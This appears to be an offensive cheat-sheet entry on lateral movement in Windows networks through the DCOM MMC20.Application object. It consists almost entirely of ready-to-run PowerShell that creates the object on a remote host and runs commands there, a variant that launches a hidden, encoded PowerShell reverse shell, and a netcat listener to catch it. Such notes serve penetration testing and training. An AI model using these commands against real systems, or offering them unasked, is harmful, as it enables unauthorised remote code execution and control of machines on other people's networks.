---
title: DCOM Lateral Movement (MMC20.Application)
category: ad
subcategory: ad-attacks
os: windows
command: $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
tools: powershell, DCOM
---


### Instantiate remote DCOM object

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```

### Run a command remotely

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### Verify

```powershell
tasklist | findstr "calc"
```

### Encoded PowerShell reverse shell variant

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")
```

Listener:

```bash
nc -lnvp 443
```
